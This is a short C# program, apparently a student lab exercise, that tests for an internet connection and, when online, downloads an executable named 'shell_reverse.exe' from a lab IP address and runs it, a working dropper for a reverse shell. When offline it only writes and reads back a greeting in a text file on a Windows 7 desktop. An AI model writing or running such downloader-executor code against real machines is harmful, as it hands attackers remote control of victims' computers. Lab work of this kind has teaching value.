using System;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;

namespace CheckInternetAndReverseShell
{
    class Program
    {
        static void Main(string[] args)
        {
            bool isConnected = CheckForInternetConnection();
            // Online
            if (isConnected == true)
            {
                var filename = "reverseShell";
                //dowload reverse shell 
                new WebClient().DownloadFile("http://192.168.222.130/shell_reverse.exe", filename);
                
                string path = AppDomain.CurrentDomain.BaseDirectory;
                // run .exe file
                System.Diagnostics.Process.Start(path + filename);
                Console.ReadLine();
            }
            else
            {
                string fileName = @"C:\Users\win7\Desktop\readme.txt";
                // Check if file already exists. If yes, delete it.     
                if (File.Exists(fileName))
                {
                    File.Delete(fileName);
                }

                // Create a new file     
                using (FileStream fs = File.Create(fileName))
                {
                    // Add some text to file    
                    Byte[] title = new UTF8Encoding(true).GetBytes("Hello from 18520545");
                    fs.Write(title, 0, title.Length);
                }
                // Open the stream and read it back.    
                using (StreamReader sr = File.OpenText(fileName))
                {
                    string s = "";
                    while ((s = sr.ReadLine()) != null)
                    {
                        Console.WriteLine(s);
                    }
                }
            }
        }
        

        public static bool CheckForInternetConnection(int timeoutMs = 10000, string url = null)
        {
            try
            {
                url ??= CultureInfo.InstalledUICulture switch
                {
                    { Name: var n } when n.StartsWith("fa") => // Iran
                        "http://www.aparat.com",
                    { Name: var n } when n.StartsWith("zh") => // China
                        "http://www.baidu.com",
                    _ =>
                        "http://www.gstatic.com/generate_204",
                };

                var request = (HttpWebRequest)WebRequest.Create(url);
                request.KeepAlive = false;
                request.Timeout = timeoutMs;
                using var response = (HttpWebResponse)request.GetResponse();
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
